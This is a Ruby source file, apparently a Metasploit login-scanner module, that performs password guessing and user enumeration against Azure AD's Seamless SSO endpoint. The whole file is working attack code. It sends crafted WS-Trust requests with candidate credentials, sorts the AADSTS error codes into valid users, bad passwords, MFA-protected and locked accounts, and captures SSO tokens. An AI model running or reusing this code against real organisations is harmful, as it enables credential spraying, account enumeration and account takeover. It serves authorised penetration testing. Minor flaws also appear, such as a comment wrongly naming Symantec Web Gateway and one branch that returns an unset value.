require 'metasploit/framework/login_scanner/http'

module Metasploit
  module Framework
    module LoginScanner

      class AzureAdSso < HTTP

        LOGIN_STATUS  = Metasploit::Model::Login::Status # Shorter name

        # Actually doing the login. Called by #attempt_login
        #
        # @param domain [String] The user domain
        # @param username [String] The username to try
        # @param password [String] The password to try
        # @return [Hash]
        #   * :status [Metasploit::Model::Login::Status]
        #   * :proof [String] the HTTP response body
        def check_login(domain, username, password)
          request_id = SecureRandom.uuid
          url = "https://#{vhost}/#{uri}"

          created = Time.new.inspect
          expires = (Time.new + 600).inspect

          message_id = SecureRandom.uuid
          username_token = SecureRandom.uuid

          body = <<-BODYEND
<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
    <s:Header>
        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
        <wsa:To s:mustUnderstand='1'>#{url}</wsa:To>
        <wsa:MessageID>urn:uuid:#{message_id}</wsa:MessageID>
        <wsse:Security s:mustUnderstand=\"1\">
            <wsu:Timestamp wsu:Id=\"_0\">
                <wsu:Created>#{created}</wsu:Created>
                <wsu:Expires>#{expires}</wsu:Expires>
            </wsu:Timestamp>
            <wsse:UsernameToken wsu:Id=\"#{username_token}\">
                <wsse:Username>#{username.strip.encode(xml: :text)}@#{domain}</wsse:Username>
                <wsse:Password>#{password.strip.encode(xml: :text)}</wsse:Password>
            </wsse:UsernameToken>
        </wsse:Security>
    </s:Header>
    <s:Body>
        <wst:RequestSecurityToken Id='RST0'>
            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                <wsp:AppliesTo>
                    <wsa:EndpointReference>
                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                    </wsa:EndpointReference>
                </wsp:AppliesTo>
                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
        </wst:RequestSecurityToken>
    </s:Body>
</s:Envelope>
BODYEND

          res = send_request({
            'uri' => uri,
            'method' => 'POST',
            'ctype' => 'application/xml',
            'vars_get' => {
              'client-request-id' => request_id
            },
            'data' => body
          })

          unless res
            return {:status => LOGIN_STATUS::UNABLE_TO_CONNECT, :proof => res.to_s}
          end

          # Check the XML response for either the SSO Token or the error code
          xml = res.get_xml_document
          xml.remove_namespaces!

          if xml.xpath('//DesktopSsoToken')[0]
            sso_token = xml.xpath('//DesktopSsoToken')[0].text
            return {status: LOGIN_STATUS::SUCCESSFUL, proof: "Desktop SSO Token: #{sso_token}"}
          end

          error_msg = xml.xpath('//internalerror/text')[0].text
          if error_msg.start_with?('AADSTS50126') # Valid user but incorrect password
            proof = "Password #{password} is invalid but #{domain}\\#{username} is valid! (Error: AADSTS50126)"
            return {:status => LOGIN_STATUS::INCORRECT, :proof => proof}
          elsif error_msg.start_with?('AADSTS50056') # User exists without a password in Azure AD
            proof = "#{domain}\\#{username} is valid but the user does not have a password in Azure AD! (Error: AADSTS50056)"
            return {:status => LOGIN_STATUS::NO_AUTH_REQUIRED, :proof => proof}
          elsif error_msg.start_with?('AADSTS50076') # User exists, but you need MFA to connect to this resource
            proof = "Login #{domain}\\#{username}:#{password} is valid, but you need MFA to connect to this resource (Error: AADSTS50076)"
            return {:status => LOGIN_STATUS::SUCCESSFUL, :proof => proof}
          elsif error_msg.start_with?('AADSTS50014') # User exists, but the maximum Pass-through Authentication time was exceeded
            proof = "#{domain}\\#{username} is valid but the maximum pass-through authentication time was exceeded (Error: AADSTS50014)"
            return {:status => LOGIN_STATUS::INCORRECT, :proof => proof}
          elsif error_msg.start_with?('AADSTS50034') # User does not exist
            print_error("#{domain}\\#{username} is not a valid user (Error: AADSTS50034)")
            return {:status => LOGIN_STATUS::INCORRECT, :proof => proof}
          elsif error_msg.start_with?('AADSTS50053') # Account is locked
            proof = 'Account is locked, consider taking time before continuuing to scan! (Error: AADSTS50053)'
            return {:status => LOGIN_STATUS::LOCKED_OUT, :proof => proof}
          else # Unknown error code
            proof = "Received unknown response with error code: #{error_msg}"
            return {:status => LOGIN_STATUS::INCORRECT, :proof => proof}
          end

        end

        # Attempts to login to Symantec Web Gateway. This is called first.
        #
        # @param credential [Metasploit::Framework::Credential] The credential object
        # @return [Result] A Result object indicating success or failure
        def attempt_login(credential)
          result_opts = {
            credential: credential,
            status: Metasploit::Model::Login::Status::INCORRECT,
            proof: nil,
            host: host,
            port: port,
            service_name: 'http',
            protocol: 'tcp'
          }

          begin
            result_opts.merge!(check_login(credential.realm, credential.public, credential.private))
          rescue ::Rex::ConnectionError => e
            result_opts.merge!(status: LOGIN_STATUS::UNABLE_TO_CONNECT, proof: e.message)
          end

          Result.new(result_opts)
        end

      end
    end
  end
end

